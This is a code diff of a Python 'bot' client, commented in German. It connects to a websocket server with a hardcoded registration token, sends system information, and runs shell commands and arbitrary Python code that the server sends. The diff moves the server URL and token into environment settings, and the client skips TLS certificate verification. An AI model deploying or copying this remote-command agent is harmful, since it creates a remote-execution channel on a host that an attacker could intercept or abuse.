@@ -23,7 +23,6 @@ MAX_COMMAND_TIMEOUT = int(os.getenv("MAX_COMMAND_TIMEOUT", "60"))
 def _load_build_config():
     """Importiert die vom Build-Skript erzeugte build_config.py."""
     try:
-        # PyInstaller entpackt Daten nach sys._MEIPASS
         if getattr(sys, 'frozen', False):
             sys.path.insert(0, sys._MEIPASS)
         import build_config
@@ -35,14 +34,30 @@ def _load_build_config():
         return None
 
 build_cfg = _load_build_config()
+
+# --- Server-URL konfigurieren ---
+SERVER_URL = os.getenv("SERVER_URL")
+if not SERVER_URL:
+    if build_cfg:
+        SERVER_URL = build_cfg["server_url"]
+    else:
+        SERVER_URL = "ws://localhost:8080/ws"
+
+# --- SSL-Kontext ---
+if SERVER_URL.startswith("wss://"):
+    import ssl
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+else:
+    ssl_context = None
+
+# --- Token ---
 if build_cfg:
-    SERVER_URL = build_cfg["server_url"]
     REGISTRATION_TOKEN = build_cfg["registration_token"]
 else:
-    SERVER_URL = "wss://192.168.1.188:443/ws"
-    REGISTRATION_TOKEN = "4a371b47dffe9807dccb004975b28fa686003ff73f7bd868"
+    REGISTRATION_TOKEN = os.getenv("REGISTRATION_TOKEN", "4a371b47dffe9807dccb004975b28fa686003ff73f7bd868")
 
-# ====================== BESTEHENDE CREDENTIALS ======================
 def load_existing_config():
     if CONFIG_FILE.exists():
         try:
@@ -60,10 +75,6 @@ def load_existing_config():
 
 async def register_bot(bot_id, server_url, reg_token):
     try:
-        import ssl
-        ssl_context = ssl.create_default_context()
-        ssl_context.check_hostname = False
-        ssl_context.verify_mode = ssl.CERT_NONE
         async with websockets.connect(server_url, ssl=ssl_context) as ws:
             await ws.send(json.dumps({
                 "type": "register_bot",
@@ -78,7 +89,6 @@ async def register_bot(bot_id, server_url, reg_token):
         logger.error(f"Registrierungsfehler: {e}")
     return None
 
-# ====================== HILFSFUNKTIONEN ======================
 async def get_system_info():
     return {
         "hostname": platform.node(),
@@ -114,10 +124,8 @@ async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# ====================== MAIN ======================
 async def main():
     global BOT_ID, BOT_SECRET
-
     existing = load_existing_config()
     if existing:
         BOT_ID, BOT_SECRET = existing
@@ -139,18 +147,19 @@ async def main():
 
     while True:
         try:
-            import ssl
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
-
-            async with websockets.connect(SERVER_URL, ssl=ssl_context, ping_interval=20, ping_timeout=40) as ws:
+            async with websockets.connect(
+                SERVER_URL,
+                ssl=ssl_context,
+                ping_interval=20,
+                ping_timeout=40
+            ) as ws:
                 await ws.send(json.dumps({
                     "type": "client",
                     "bot_id": BOT_ID,
                     "bot_secret": BOT_SECRET
                 }))
                 logger.info(f"✅ Verbunden als {BOT_ID}")
+
                 async for raw_msg in ws:
                     try:
                         msg = json.loads(raw_msg)
@@ -235,8 +244,7 @@ async def main():
                                         "output": str(exec_globals.get("output", "Code executed"))
                                     })
                                 elif action == "ps":
-                                    processes = [{"pid": p.info['pid'], "name": p.info['name']}
-                                                 for p in psutil.process_iter(['pid', 'name'])][:30]
+                                    processes = [{"pid": p.info['pid'], "name": p.info['name']} for p in psutil.process_iter(['pid', 'name'])][:30]
                                     result.update({"success": True, "processes": processes})
                                 elif action == "ping":
                                     result.update({"success": True, "message": "pong"})
